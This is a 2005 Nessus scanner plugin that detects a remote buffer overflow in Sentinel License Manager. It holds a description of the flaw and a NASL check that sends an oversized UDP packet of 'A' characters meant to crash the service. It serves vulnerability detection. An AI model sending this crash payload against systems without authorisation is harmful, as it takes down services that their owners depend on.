#
# (C) Tenable Network Security
#


if (description) {
  script_id(17326);
  script_version("$Revision: 1.1 $");

  script_cve_id("CAN-2005-0353");
  script_bugtraq_id(12742);

  script_name(english:"Sentinel License Manager Remote Buffer Overflow Vulnerability");

  desc["english"] = "
The remote host is running a version of Sentinel License Manager that
is subject to remote buffer overflows.  By sending 3000 bytes or more
to the UDP port on which it listens (5093 by default), a remote
attacker can crash the LServnt.exe service, overwrite the EIP
register, and possibly execute arbitrary code. 

See also : http://www.cirt.dk/advisories/cirt-30-advisory.pdf

Solution : Upgrade to Sentinel License Manager 8.0.0 or greater.

Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Detects remote buffer overflow vulnerability in Sentinel License Manager";
  script_summary(english:summary["english"]);
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security.");

  script_category(ACT_DENIAL);
  family["english"] = "Gain a shell remotely";
  script_family(english:family["english"]);

  script_dependencie("find_service.nes");
  script_require_ports("Services/sentinel-lm", 5093);
  exit(0);
}


port = get_kb_item("Services/sentinel-lm");
if (!port) port = 5093;
if (!get_port_state(port)) exit(0);

soc = open_sock_udp (port);
if (!soc) exit (0);

data = crap (data:"A", length:256);
send (socket:soc, data:data);
buf = recv (socket:soc, length:4096);

if (!buf || (strlen(buf) != 256)) exit (0);

# if not Sentinel LM (allways the sane reply)
if (!egrep (pattern:"^AAAAAAAAAAAA,PSH.*", string:buf)) exit(0);

# we try to crash it
# no safe checks as the only change is strcpy to strncpy and patched buffer is bigger
# 7.3 seems to be fixed

data = crap (data:"A", length:1400);
send (socket:soc, data:data);
buf = recv (socket:soc, length:4096);

if (!buf)
  security_hole (port);

